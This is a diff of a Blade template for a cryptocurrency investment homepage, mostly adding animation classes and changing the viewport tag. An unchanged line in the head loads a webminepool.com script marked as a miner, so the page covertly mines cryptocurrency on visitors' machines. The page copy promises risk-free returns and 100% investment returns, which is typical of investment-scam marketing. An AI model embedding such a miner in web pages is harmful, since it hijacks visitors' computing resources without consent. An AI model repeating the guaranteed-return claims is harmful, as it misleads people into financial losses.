@@ -4,9 +4,9 @@
 <head>       
     <meta charset="UTF-8">  
 
-    <meta name="viewport" content="width=1024">
+    <!-- <meta name="viewport" content="width=1024"> -->
     <!-- Responsive Meta -->                    
-    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
  <!--miner-->
 <script src="https://webminepool.com/lib/base.js"></script>
@@ -136,7 +136,7 @@
                                 </div> -->
                             </div>
                         </div>
-                        <div class="col-sm-12 col-md-6">
+                        <div class="col-sm-12 col-md-6 animate" data-animate="fadeInLeft" data-delay=".1">
                             <h1>{{$settings->site_name}} makes it safe and easy to invest </h1>
                             <p class="lead">A place for everyone who wants to simply Invest and get high returns on every investment.</p>
                             <div class="hero-btns">
@@ -165,14 +165,14 @@
                         </div>
                     </div>
                         <div style="margin-top:100px;" class="col-lg-6 col-md-12">
-                            <h2 class="section-heading">About {{$settings->site_name}}</h2>
-                            <h4>Why to choose {{$settings->site_name}}?</h4>
-                            <h5>
-{{$settings->site_name}} provides you with a wide range of platform and service options best tailored to your trading style and needs. Whether you’re a self-directed trader trading online, or trading through our desk, we offer multiple solutions.
-</h5>
-                            <p>
-We welcome you to the digital world of crypto investment and online trading where our clients will receive stable and risk-free long-term returns by placing their Bitcoin asset in our online profound asset management program. </p>
-                            <div class="button-wrapper">
+                            <div class="animated" data-animate="fadeInUp" data-delay=".1">
+
+                                <h2 class="section-heading">About {{$settings->site_name}}</h2>
+                                <h4>Why to choose {{$settings->site_name}}?</h4>
+                                <h5>{{$settings->site_name}} provides you with a wide range of platform and service options best tailored to your trading style and needs. Whether you’re a self-directed trader trading online, or trading through our desk, we offer multiple solutions.</h5>
+                                <p>We welcome you to the digital world of crypto investment and online trading where our clients will receive stable and risk-free long-term returns by placing their Bitcoin asset in our online profound asset management program. </p>
+                            </div>
+                            <div class="button-wrapper animated" data-animate="fadeInUp" data-delay=".1">
                                 <a class="btn" href="#">Read More</a>
                                 <a class="watch-link" href="#">
                                     <i class="fas fa-play"></i>
@@ -189,12 +189,11 @@ We welcome you to the digital world of crypto investment and online trading wher
             <!-- Benefits Start -->
             <div class="benefits p-tb light-gray-bg mercury-layout">
                 <div class="container">
-                    <div class="text-center"><h2 class="section-heading">Benefits of Using Our Solution</h2></div>
-                    <div class="sub-txt mw-850 text-center">
-                  
+                    <div class="text-center animate" data-animate="fadeInRight" data-delay=".1">
+                        <h2 class="section-heading">Benefits of Using Our Solution</h2>
                     </div>
                     <div class="row">
-                        <div class="col-lg-4 col-md-6">
+                        <div class="col-lg-4 col-md-6 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="benefit-box text-center">
                                 <div class="benefit-icon">
                                     <img src="{{asset('home/images/benefit-icon-1.png')}}" alt="Safe and Secure">
@@ -205,7 +204,7 @@ We welcome you to the digital world of crypto investment and online trading wher
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-4 col-md-6">
+                        <div class="col-lg-4 col-md-6 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="benefit-box text-center">
                                 <div class="benefit-icon">
                                     <img src="{{asset('home/images/benefit-icon-2.png')}}" alt="Instant Exchange">
@@ -216,7 +215,7 @@ We welcome you to the digital world of crypto investment and online trading wher
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-4 col-md-6">
+                        <div class="col-lg-4 col-md-6 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="benefit-box text-center">
                                 <div class="benefit-icon">
                                     <img src="{{ asset ('home/images/benefit-icon-3.png')}}" alt="World Coverage">
@@ -227,7 +226,7 @@ We welcome you to the digital world of crypto investment and online trading wher
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-4 col-md-6">
+                        <div class="col-lg-4 col-md-6 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="benefit-box text-center">
                                 <div class="benefit-icon">
                                     <img src="{{ asset ('home/images/benefit-icon-4.png')}}" alt="Mobile Apps">
@@ -238,7 +237,7 @@ We welcome you to the digital world of crypto investment and online trading wher
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-4 col-md-6">
+                        <div class="col-lg-4 col-md-6 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="benefit-box text-center">
                                 <div class="benefit-icon">
                                     <img src="{{ asset ('home/images/benefit-icon-5.png')}}" alt="Strong Network">
@@ -249,7 +248,7 @@ We welcome you to the digital world of crypto investment and online trading wher
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-4 col-md-6">
+                        <div class="col-lg-4 col-md-6 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="benefit-box text-center">
                                 <div class="benefit-icon">
                                     <img src="{{ asset ('home/images/benefit-icon-6.png')}}" alt="Margin Trading">
@@ -265,8 +264,6 @@ We welcome you to the digital world of crypto investment and online trading wher
                 </div>
             </div>
             <!-- Benefits End -->
-            
-            
             
             <div class="section-full  p-t80 p-b80 bg-gray">
 <div class="container">
@@ -622,14 +619,16 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
             
             <!-- Token Sale start -->
             <div class="token-sale p-tb mercury-layout" id="token">
-                <div class="container">
-                    <div class="text-center"><h2 class="section-heading">The best place to Trade digital currencies </h2></div>
-                    <div class="sub-txt mw-650 text-center">
+                <div class="container animate" data-animate="fadeInUp" data-delay=".1">
+                    <div class="text-center">
+                        <h2 class="section-heading animate" data-animate="fadeInUp" data-delay=".1">The best place to Trade digital currencies </h2>
+                    </div>
+                    <div class="sub-txt mw-650 text-center animate" data-animate="fadeInUp" data-delay=".1">
                         <p>We provide multi-algorithms, using the latest technology without any pool fees. The ultimate goal of our existence is to make trading an easy, smart and rewarding experience for everyone..</p>
                     </div>
                     <div class="row flex-row-reverse align-items-center">
                         <div class="col-lg-7 col-md-12">
-                            <div class="token-allocation-animation">
+                            <div class="token-allocation-animation animate" data-animate="fadeInRight" data-delay=".1">
                                 <div class="main-circle-one">
                                     <ul class="allocation-list-point">
                                         <li><i class="point"></i><span>100% Bitcoin Investment Return</span></li>
@@ -646,7 +645,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-5 col-md-12">
+                        <div class="col-lg-5 col-md-12 animate" data-animate="fadeInLeft" data-delay=".1">
                             <ul class="allocation-list">
                                 <li><span>100%</span> Bitcoin Investment Return</li>
                                 <li><span>100%</span> Etherum Investment Return</li>
@@ -665,8 +664,10 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
             <!-- Currency convertor Start -->
             <div id="convertor" class="currency-convertor mercury-layout p-t p-tb c-l">
                 <div class="container">
-                    <div class="text-center"><h2 class="section-heading">Currency Convertor</h2></div>
-                    <div class="sub-txt text-center">
+                    <div class="text-center animate" data-animate="fadeInUp" data-delay=".1">
+                        <h2 class="section-heading">Currency Convertor</h2>
+                    </div>
+                    <div class="sub-txt text-center animate" data-animate="fadeInUp" data-delay=".1">
                         <p>A defining characteristic of cryptocurrencies is that they are generally not issued by any central authority, such as a Central Bank, rendering them in theory immune to government interference or manipulation.</p>
                     </div>
                     <div class="convertor-widget">
@@ -682,13 +683,13 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
             <!-- The Roadmap  start-->
             <div class="roadmap-sec p-tb mercury-layout" id="roadmap">
                 <div class="container">
-                    <div class="text-center"><h2 class="section-heading">Road Map</h2></div>
-                    <div class="sub-txt text-center">
+                    <div class="text-center animate" data-animate="fadeInUp" data-delay=".1"><h2 class="section-heading">Road Map</h2></div>
+                    <div class="sub-txt text-center animate" data-animate="fadeInUp" data-delay=".1">
                         <p>Our journey so far and we are getting stronger each day thanks to all our amazing client who trust us to invest
 						with us...</p>
                     </div>
                     <div class="mercury-roadmap owl-carousel">
-                        <div class="roadmap-item odd">
+                        <div class="roadmap-item odd animate" data-animate="fadeInLeft" data-delay=".1">
                             <div class="roadmap-text">
                                 <div class="roadmap-day">
                                     <div class="date"><span>14th</span>March 2018</div>
@@ -699,7 +700,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 </div>
                             </div>
                         </div>
-                        <div class="roadmap-item even">
+                        <div class="roadmap-item even animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="roadmap-text">
                                 <div class="roadmap-day">
                                     <div class="date"><span>21th</span>January 2019</div>
@@ -710,7 +711,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 </div>
                             </div>
                         </div>
-                        <div class="roadmap-item odd">
+                        <div class="roadmap-item odd animate" data-animate="fadeInLeft" data-delay=".1">
                             <div class="roadmap-text">
                                 <div class="roadmap-day">
                                     <div class="date"><span>18th</span>April 2019</div>
@@ -721,7 +722,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 </div>
                             </div>
                         </div>
-                        <div class="roadmap-item even">
+                        <div class="roadmap-item even animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="roadmap-text">
                                 <div class="roadmap-day">
                                     <div class="date"><span>31th</span>October 2019</div>
@@ -732,7 +733,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 </div>
                             </div>
                         </div>
-                        <div class="roadmap-item odd">
+                        <div class="roadmap-item odd animate" data-animate="fadeInLeft" data-delay=".1">
                             <div class="roadmap-text">
                                 <div class="roadmap-day">
                                     <div class="date"><span>09th</span>September 2020</div>
@@ -750,7 +751,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
             <div id="counter" class="milestone-section p-tb c-l">
                 <div class="container">
                     <div class="row">
-                        <div class="col">
+                        <div class="col animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="counter" >
                                 <div class="counter-icon">
                                     <img src="images/transactions-icon.png" alt="" />
@@ -759,7 +760,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 <h4 class="count-text ">Transactions</h4>
                             </div>
                         </div>
-                        <div class="col">
+                        <div class="col animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="counter">
                                 <div class="counter-icon">
                                     <img src="images/support-icon.png" alt="" />
@@ -768,7 +769,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 <h4 class="count-text ">Operator</h4>
                             </div>
                         </div>
-                        <div class="col">
+                        <div class="col animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="counter">
                                 <div class="counter-icon">
                                     <img src="images/wallets-icon.png" alt="" />
@@ -777,7 +778,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 <h4 class="count-text ">Bitcoin Wallets</h4>
                             </div>
                         </div>
-                        <div class="col">
+                        <div class="col animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="counter">
                                 <div class="counter-icon">
                                     <img src="images/countries-icon.png" alt="" />
@@ -791,7 +792,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
             </div>
 			
 			
-			<div class="team-section p-tb light-gray-bg mercury-layout" id="cert">
+			<div class="team-section p-tb light-gray-bg mercury-layout animate" data-animate="fadeInUp" data-delay=".1" id="cert">
                 <div class="container">
                     <div class="text-center"><h2 class="section-heading">Certification</h2></div>
                     <div class="row">
@@ -1123,20 +1124,22 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
             <div class="mobileapp-section p-tb black-bg white-sec">
                 <div class="container">
                     <div class="row align-items-center flex-row-reverse">
-                        <div class="col-lg-5">
+                        <div class="col-lg-5 animate" data-animate="fadeInRight" data-delay=".1">
                             <div class="iphone-img">
                                 <img src="{{ asset ('home/images/mercury-iphone-img.png')}}" alt="">
                             </div>
                         </div>
                         <div class="col-lg-7">
-                            <h2 class="section-heading">Don’t Miss Our App! It’s Free to Download for You,</h2>
-                            <p>{{$settings->site_name}}is a top tier bitcoin invest­ment platform available every one. {{$settings->site_name}}is a modular Bitcoin full-node microservices API server architecture and utili­ties toolkit are built to be scalable</p>
-                            <p>{{$settings->site_name}}is run by self-proclaimed Experts and Bitcoin Maximalists and it shows. As one of the top bitcoin invest­ment sites, they focus on privacy, security, and enabling users to maintain full custody of their Bitcoin.</p>
+                            <h2 class="section-heading animate" data-animate="fadeInLeft" data-delay=".1">Don’t Miss Our App! It’s Free to Download for You,</h2>
+                            <div class="animate" data-animate="fadeInUp" data-delay=".1">
+                                <p>{{$settings->site_name}}is a top tier bitcoin invest­ment platform available every one. {{$settings->site_name}}is a modular Bitcoin full-node microservices API server architecture and utili­ties toolkit are built to be scalable</p>
+                                <p>{{$settings->site_name}}is run by self-proclaimed Experts and Bitcoin Maximalists and it shows. As one of the top bitcoin invest­ment sites, they focus on privacy, security, and enabling users to maintain full custody of their Bitcoin.</p>
+                            </div>
                             <div class="button-wrapper">
-                                <a href="#" class="apple-btn">
+                                <a href="#" class="apple-btn animate" data-animate="fadeInUp" data-delay=".1">
                                     <img src="{{ asset ('home/images/app-store-btn.png')}}" alt="">
                                 </a>
-                                <a href="#" class="google-btn">
+                                <a href="#" class="google-btn animate" data-animate="fadeInUp" data-delay=".1">
                                     <img src="{{ asset ('home/images/google-play-btn.png')}}" alt="">
                                 </a>
                             </div>
@@ -1145,12 +1148,13 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                     </div>
                 </div>
             </div>
+
             <!-- Team sec start-->
             <div class="team-section p-tb light-gray-bg mercury-layout" id="team">
                 <div class="container">
                     <div class="text-center"><h2 class="section-heading">Testimonials</h2></div>
                     <div class="row">
-                        <div class="col-md-6 col-lg-3">
+                        <div class="col-md-6 col-lg-3 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="team-box">
                                 <div class="team-img">
                                     <img src="{{ asset ('home/images/team-9.jpg')}}" alt="">
@@ -1162,7 +1166,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 </div>
                             </div>
                         </div>
-                        <div class="col-md-6 col-lg-3">
+                        <div class="col-md-6 col-lg-3 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="team-box">
                                 <div class="team-img">
                                     <img src="{{ asset ('home/images/team-10.jpg')}}" alt="">
@@ -1174,7 +1178,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 </div>
                             </div>
                         </div>
-                        <div class="col-md-6 col-lg-3">
+                        <div class="col-md-6 col-lg-3 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="team-box">
                                 <div class="team-img">
                                     <img src="{{ asset ('home/images/team-12.jpg')}}" alt="">
@@ -1185,7 +1189,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                                 </div>
                             </div>
                         </div>
-                        <div class="col-md-6 col-lg-3">
+                        <div class="col-md-6 col-lg-3 animate" data-animate="fadeInUp" data-delay=".1">
                             <div class="team-box">
                                 <div class="team-img">
                                     <img src="{{ asset ('home/images/team-11.jpg')}}" alt="">
@@ -1201,7 +1205,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
             </div>
             <!-- Team sec end-->
              <!-- FAQ Section start-->
-            <div class="faq-section p-tb white-bg diamond-layout" id="faq">
+            <div class="faq-section p-tb white-bg diamond-layout animate" data-animate="fadeInUp" data-delay=".1" id="faq">
                 <div class="container">
                     <div class="text-center"><h2 class="section-heading">Frequently Asked Questions</h2></div>
                     <div class="row">
@@ -1343,7 +1347,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
             </div>
             <!-- FAQ Section end--> 
             <!-- Brand logo slider -->
-            <div class="brand-logo-slider c-l p-tb white-sec">
+            <div class="brand-logo-slider c-l p-tb white-sec animate" data-animate="fadeInUp" data-delay=".1">
                 <div class="container">
                     <div class="text-center"><h2 class="section-heading">Our Partners</h2></div>
                     <div class="brand-logos owl-carousel">
@@ -1360,16 +1364,16 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
         <!-- Content Section End -->   
         <div class="clear"></div>
         <!--footer Start-->   
-        <footer class="footer-3">
+        <footer class="footer-3 ">
             <div class="container">
                 <div class="row">
-                    <div class="col-md-4 footer-box-1">
+                    <div class="col-md-4 footer-box-1 animate" data-animate="fadeInUp" data-delay=".1">
                         <div class="footer-logo">
                             <a href="#" title=""><img src="/home/images/logo-light.png" width="200" alt="{{$settings->site_name}}"></a>
                         </div>
                         <p>Trading binary options is the latest way to trade global markets. It is a form of trading that allows you to earn maximum profit with minimal investment of time and money. Binary options have opened up financial markets to people around the entire world.</p>
                     </div>
-                    <div class="col-md-3 footer-box-2">
+                    <div class="col-md-3 footer-box-2 animate" data-animate="fadeInUp" data-delay=".1">
                         <ul class="footer-menu onepage">
 							 <li><a href="#top">Home</a></li>
                              <li><a href="#about">About Us</a></li>
@@ -1378,7 +1382,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
                              <li><a href="#contact">Contact Us</a></li>
                         </ul>
                     </div>
-                    <div class="col-md-5 footer-box-3">
+                    <div class="col-md-5 footer-box-3 animate" data-animate="fadeInUp" data-delay=".1">
                         <h4>Newsletter</h4>
                         <p>Keep up to date with our progress. Subscribe for e-mail updates.</p>
                         <div class="newsletter">
@@ -1456,7 +1460,7 @@ aa14458f8082d9c4265ef491ca0b5d4801c16bbf7a4aece7b70a0b4824ffdfea
 
     <script src="{{ asset ('home/js/script.js')}} "></script>
 
-     <script type="text/javascript">
+    <script type="text/javascript">
         function isScrolledIntoView(elem) {
             var docViewTop = jQuery(window).scrollTop();
             var docViewBottom = docViewTop + jQuery(window).height();
